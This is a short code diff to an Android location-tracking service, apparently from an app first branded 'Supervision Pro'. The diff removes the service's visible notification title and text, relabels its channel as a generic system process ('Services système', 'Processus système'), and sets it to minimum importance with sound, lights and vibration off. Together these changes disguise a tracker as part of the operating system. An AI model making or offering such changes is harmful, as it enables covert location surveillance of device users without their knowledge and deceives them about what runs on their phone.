@@ -44,9 +44,7 @@ class LocationService : Service() {
         )
 
         val notification = Notification.Builder(this, CHANNEL_ID)
-            .setContentTitle("Supervision Pro")
-            .setContentText("Service actif")
-            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setSmallIcon(android.R.drawable.ic_menu_info_details)
             .setContentIntent(pendingIntent)
             .setOngoing(true)
             .build()
@@ -149,11 +147,14 @@ class LocationService : Service() {
     private fun createNotificationChannel() {
         val channel = NotificationChannel(
             CHANNEL_ID,
-            "Supervision Pro",
-            NotificationManager.IMPORTANCE_LOW
+            "Services système",
+            NotificationManager.IMPORTANCE_MIN
         ).apply {
-            description = "Service de supervision de l'appareil professionnel"
+            description = "Processus système"
             setShowBadge(false)
+            setSound(null, null)
+            enableLights(false)
+            enableVibration(false)
         }
         getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
     }
